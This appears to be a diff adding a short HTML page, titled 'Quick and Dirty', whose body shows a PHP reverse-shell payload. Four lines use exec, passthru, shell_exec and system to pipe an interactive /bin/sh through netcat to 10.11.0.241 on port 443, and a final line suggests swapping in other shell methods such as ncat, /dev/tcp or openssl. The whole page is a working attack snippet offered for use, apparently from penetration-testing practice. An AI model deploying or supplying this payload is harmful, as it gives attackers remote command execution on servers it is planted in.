@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Quick and Dirty</title>
+</head><body>&lt;?php<br/>
+exec('rm /tmp/j; mkfifo /tmp/j; cat /tmp/j | /bin/sh -i 2&gt;&amp;1 | nc 10.11.0.241 443 &gt; /tmp/j');<br/>
+passthru('rm /tmp/k; mkfifo /tmp/k; cat /tmp/k | /bin/sh -i 2&gt;&amp;1 | nc 10.11.0.241 443 &gt; /tmp/k');<br/>
+shell_exec('rm /tmp/l; mkfifo /tmp/l; cat /tmp/l | /bin/sh -i 2&gt;&amp;1 | nc 10.11.0.241 443 &gt; /tmp/l');<br/>
+system('rm /tmp/m; mkfifo /tmp/m; cat /tmp/m | /bin/sh -i 2&gt;&amp;1 | nc 10.11.0.241 443 &gt; /tmp/m');<br/>
+&nbsp;?&gt;<br/>
+<br/>
+<br/>
+replace with your favorite shell method (nc, ncat, dev/tcp, openssl, etc)</body></html>
